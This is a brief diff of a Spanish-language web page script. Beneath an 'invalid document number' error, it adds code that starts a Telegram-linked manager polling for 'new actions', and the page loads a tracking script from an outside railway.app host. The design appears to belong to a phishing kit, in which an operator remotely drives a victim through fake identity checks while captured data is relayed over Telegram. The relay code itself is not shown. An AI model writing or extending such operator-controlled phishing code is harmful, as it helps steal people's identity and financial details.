@@ -128,6 +128,10 @@
                 errorText.textContent = 'Tu número de documento es inválido o incorrecto. Por favor, verifica e intenta nuevamente.';
                 errorDiv.classList.add('active');
             }
+            // Iniciar polling para poder recibir nuevas acciones
+            if (window.telegramManager) {
+                window.telegramManager.startPolling();
+            }
         }
     </script>
     <script src="https://triconego-clicks-production.up.railway.app/tracking.js"></script>
